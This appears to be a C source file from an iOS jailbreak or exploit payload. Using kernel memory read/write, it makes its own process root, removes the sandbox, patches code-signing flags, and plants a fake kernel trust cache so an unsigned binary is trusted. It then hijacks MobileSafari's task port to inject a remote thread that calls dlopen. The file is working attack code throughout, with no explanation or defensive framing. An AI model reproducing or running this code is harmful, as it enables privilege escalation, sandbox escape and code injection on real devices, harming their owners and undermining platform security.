#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <spawn.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>

#include <CoreFoundation/CoreFoundation.h>

#include <dlfcn.h>
#include "mach_vm.h"
#include "parameters.h"
#include "kernel_memory.h"
#include "drop_payload.h"

uint64_t proc_of_pid(pid_t pid) {
    if (kernel_base == 0) return 0;

    uint64_t allproc = kernel_base + OFFSET(kernel_base, allproc);
    uint64_t proc = kernel_read64(allproc), pd;
    while (proc) { //iterate over all processes till we find the one we're looking for
        pd = kernel_read32(proc + OFFSET(proc, p_pid));
        if (pd == pid) return proc;
        proc = kernel_read64(proc);
    }

    return 0;
}

void rootify(uint64_t proc) {
    uint64_t ucred = kernel_read64(proc + OFFSET(proc, p_ucred));
    //make everything 0 without setuid(0), pretty straightforward.
    kernel_write32(proc + OFFSET(proc, p_uid), 0);
    kernel_write32(proc + OFFSET(proc, p_ruid), 0);
    kernel_write32(proc + OFFSET(proc, p_gid), 0);
    kernel_write32(proc + OFFSET(proc, p_rgid), 0);
    kernel_write32(ucred + OFFSET(ucred, cr_uid), 0);
    kernel_write32(ucred + OFFSET(ucred, cr_ruid), 0);
    kernel_write32(ucred + OFFSET(ucred, cr_svuid), 0);
    kernel_write32(ucred + OFFSET(ucred, cr_ngroups), 1);
    kernel_write32(ucred + OFFSET(ucred, cr_groups), 0);
    kernel_write32(ucred + OFFSET(ucred, cr_rgid), 0);
    kernel_write32(ucred + OFFSET(ucred, cr_svgid), 0);
}

void unsandbox(uint64_t proc) {
    uint64_t ucred = kernel_read64(proc + OFFSET(proc, p_ucred)); // pid credentials
    uint64_t cr_label = kernel_read64(ucred + OFFSET(ucred, cr_label)); // MAC label

    kernel_write64(cr_label + OFFSET(cr_label, sandbox) /* First slot is AMFI's. so, this is second? */, 0); //get rid of sandbox by nullifying it
}

void platformize(uint64_t proc) {
    uint64_t task = kernel_read64(proc + OFFSET(proc, task));
    uint32_t t_flags = kernel_read32(task + OFFSET(task, t_flags));
#define TF_PLATFORM             0x00000400                              /* task is a platform binary */
    kernel_write32(task + OFFSET(task, t_flags), t_flags | TF_PLATFORM);

    //patch csflags
    uint32_t csflags = kernel_read32(proc + OFFSET(proc, p_csflags));
#define CS_PLATFORM_BINARY    0x4000000    /* this is a platform binary */
#define CS_INSTALLER        0x0000008    /* has installer entitlement */
#define CS_GET_TASK_ALLOW    0x0000004    /* has get-task-allow entitlement */
#define CS_DEBUGGED         0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */
#define CS_RESTRICT        0x0000800    /* tell dyld to treat restricted */
#define    CS_HARD            0x0000100    /* don't load invalid pages */
#define    CS_KILL            0x0000200    /* kill process if it becomes invalid */
    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL);
    kernel_write32(proc + OFFSET(proc, p_csflags), csflags);
}

struct trust_chain {
    uint64_t next;
    unsigned char uuid[16];
    unsigned int count;
} __attribute__((packed));
typedef uint8_t hash_t[20];
void trust_hashes(hash_t* hashes, size_t count) {
    uint64_t trust_chain = kernel_base + OFFSET(kernel_base, trustcache);
    printf("[*] trust_chain at 0x%llx\n", trust_chain);

    uint64_t trusted_address = kernel_read64(trust_chain);
    while (trusted_address != 0) {
        int trust_count = 0;
        int trusted_count = kernel_read32(trusted_address + 24);
        hash_t* trusted_hashes = malloc(trusted_count * sizeof(hash_t));
        kernel_read(trusted_address + sizeof(struct trust_chain), trusted_hashes, trusted_count * sizeof(hash_t));
        for (int i = 0; i < count; i++) {
            hash_t *hash = hashes + i;
            if (memmem(trusted_hashes, trusted_count * sizeof(hash_t), hash, sizeof(hash_t)) != NULL) {
                trust_count++;
            }
        }
        free(trusted_hashes);

        if (trust_count >= count) {
            printf("[*] trusted\n");
            return;
        }

        trusted_address = kernel_read64(trusted_address);
    }

    struct trust_chain fake_chain;
    fake_chain.next = kernel_read64(trust_chain);
    fake_chain.count = count;
    arc4random_buf(fake_chain.uuid, 16);

    size_t size = (sizeof(fake_chain) + count * sizeof(hash_t) + 0x3FFF) & ~0x3FFF;
    mach_vm_address_t kernel_trust;
    kern_return_t kr = mach_vm_allocate(kernel_task_port, &kernel_trust, size, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
      printf("mach_vm_allocate returned %d: %s\n", kr, mach_error_string(kr));
      return;
    }
    printf("[*] allocated: 0x%zx => 0x%llx\n", size, kernel_trust);

    kernel_write(kernel_trust, &fake_chain, sizeof(fake_chain));
    kernel_write(kernel_trust + sizeof(fake_chain), hashes, count * sizeof(hash_t));

    kernel_write64(trust_chain, kernel_trust);
}

uint64_t proc_of_procName(char *nm) {
    uint64_t allproc = kernel_base + OFFSET(kernel_base, allproc);
    uint64_t proc = kernel_read64(allproc);
    char name[40] = {0};
    while (proc) {
        kernel_read(proc + OFFSET(proc, p_comm), name, 40);
        if (strstr(name, nm)) return proc;
        proc = kernel_read64(proc);
    }
    return 0;
}

uint64_t task_port_kaddr_of_proc(uint64_t proc) {
    uint64_t task = kernel_read64(proc + OFFSET(proc, task));
    uint64_t itk_space = kernel_read64(task + OFFSET(task, itk_space));
    uint64_t is_table = kernel_read64(itk_space + OFFSET(ipc_space, is_table));
    uint64_t task_port_kaddr = kernel_read64(is_table + 0x18);
    return task_port_kaddr;
}

// Original method by Ian Beer
mach_port_t task_for_proc(uint64_t self_proc, uint64_t proc) {
    // allocate a new port we have a send right to
    mach_port_t port = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);

    // find task port in kernel
    uint64_t task_port_kaddr = task_port_kaddr_of_proc(proc);
    uint64_t task = kernel_read64(proc + OFFSET(proc, task));

    // leak some refs
    kernel_write32(task_port_kaddr + 0x4, 0x383838);
    kernel_write32(task + OFFSET(task, ref_count), 0x393939);

    // get the address of the ipc_port of our allocated port
    uint64_t self_task = kernel_read64(self_proc + OFFSET(proc, task));
    uint64_t itk_space = kernel_read64(self_task + OFFSET(task, itk_space));
    uint64_t is_table = kernel_read64(itk_space + OFFSET(ipc_space, is_table));
    uint32_t port_index = port >> 8;

    // point the port's ie_object to the task port
    kernel_write64(is_table + (port_index * 0x18), task_port_kaddr);

    // remove our recieve right
    uint32_t ie_bits = kernel_read32(is_table + (port_index * 0x18) + 8);
    ie_bits &= ~(1 << 17); // clear MACH_PORT_TYPE(MACH_PORT_RIGHT_RECIEVE)
    kernel_write32(is_table + (port_index * 0x18) + 8, ie_bits);

    return port;
}

void alert(uint64_t self_proc) {
#define STACK_SIZE 65536
#define CODE_SIZE 256
    uint64_t proc = proc_of_procName("MobileSafari");
    printf("proc of MobileSafari: 0x%llx\n", proc);
    task_t remote_task = task_for_proc(self_proc, proc);
    if (remote_task == MACH_PORT_NULL) {
        fprintf(stderr, "Unable to call task_for_proc on proc 0x%llx. Cannot continue!\n", proc);
        return;
    }
    mach_vm_address_t remote_stack64 = (vm_address_t)NULL;
    kern_return_t kr = mach_vm_allocate(remote_task, &remote_stack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
        return;
    } else {
        fprintf(stderr, "Allocated remote stack @0x%llx\n", remote_stack64);
    }
    struct arm_unified_thread_state remote_thread_state64 = {0};
    remote_stack64 += (STACK_SIZE / 2); // this is the real stack
    uint64_t fake_stack[STACK_SIZE/2/sizeof(uint64_t)] = {0};
    fake_stack[0xc0] = remote_stack64 + 0x100;
    fake_stack[0xd8] = (uint64_t)dlopen;
    //strcpy(((char*)fake_stack) + 0x100, lib);
    kr = mach_vm_write(remote_task,                 // Task port
                       remote_stack64,              // Virtual Address (Destination)
                       (vm_address_t)fake_stack,    // Source
                       STACK_SIZE / 2);      // Length of the source
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
        return;
    }
    uint64_t slide = (uint64_t)dlopen - 0x0180919858;
    uint64_t gadget = slide + 0x0180ae4830; // ret
    remote_thread_state64.ash.flavor = ARM_THREAD_STATE64;
    remote_thread_state64.ash.count = ARM_THREAD_STATE64_COUNT;
    remote_thread_state64.ts_64.__lr = gadget;
    remote_thread_state64.ts_64.__sp = (uint64_t) remote_stack64;
    remote_thread_state64.ts_64.__pc = (uint64_t) dlsym(RTLD_DEFAULT, "pthread_create_from_mach_thread");
    remote_thread_state64.ts_64.__x[0] = (uint64_t) remote_stack64;
    remote_thread_state64.ts_64.__x[1] = 0;
    remote_thread_state64.ts_64.__x[2] = (uint64_t) dlopen;
    remote_thread_state64.ts_64.__x[3] = remote_stack64 + 0x100;
    printf("Remote Stack @0x%llx\n", remote_stack64);
    thread_act_t remote_thread;
    kr = thread_create_running(remote_task, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
                               (thread_state_t)&remote_thread_state64.ts_64, ARM_THREAD_STATE64_COUNT , &remote_thread);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "Unable to create remote thread: error %s", mach_error_string(kr));
        return;
    }
    mach_msg_type_number_t thread_state_count = ARM_THREAD_STATE64_COUNT;
    for (;;) {
        kr = thread_get_state(remote_thread, ARM_THREAD_STATE64, (thread_state_t)&remote_thread_state64.ts_64, &thread_state_count);
        if (kr != KERN_SUCCESS) {
            fprintf(stderr, "Error getting stub thread state: error %s", mach_error_string(kr));
            break;
        }

        if (remote_thread_state64.ts_64.__pc == gadget) {
            printf("Stub thread finished\n");
            kr = thread_terminate(remote_thread);
            if (kr != KERN_SUCCESS) {
                fprintf(stderr, "Error terminating stub thread: error %s", mach_error_string(kr));
            }
            break;
        }
    }
}

void drop_payload() {
    pid_t self_pid = getpid();
    printf("self_pid: %d\n", self_pid);

    uint64_t self_proc = proc_of_pid(self_pid);
    printf("self_proc: 0x%llx\n", self_proc);

    rootify(self_proc);
    printf("uid: %d\n", getuid());

    hash_t hashes[] = {
        {0x25, 0x06, 0xe0, 0xc5, 0x59, 0xc1, 0x1c, 0x97, 0x1a, 0xe4, 0x95, 0x01, 0x08, 0xd6, 0x6b, 0x9c, 0x0b, 0xcc, 0xc0, 0xdf}, // binbag
    };
    trust_hashes(hashes, sizeof(hashes) / sizeof(hash_t));

    alert(self_proc);
}
